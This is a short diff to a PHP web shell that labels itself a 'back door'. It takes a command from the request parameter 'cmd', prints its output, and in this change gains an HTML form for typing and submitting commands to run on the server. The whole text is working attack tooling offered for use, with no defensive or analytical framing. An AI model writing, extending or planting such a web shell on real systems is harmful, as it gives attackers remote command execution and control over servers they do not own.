@@ -57,6 +57,12 @@ if (isset($_REQUEST['cmd'])) {
     echo "<pre>$output</pre>";
 
 } else {
-    echo "Here is back door. ?cmd=whoami";
+    echo "<p>Here is back door. Use the form below to run commands.</p>";
 }
 ?>
+
+<form method="POST" action="">
+    <label for="cmd">Command:</label>
+    <input type="text" id="cmd" name="cmd">
+    <input type="submit" value="Run">
+</form>
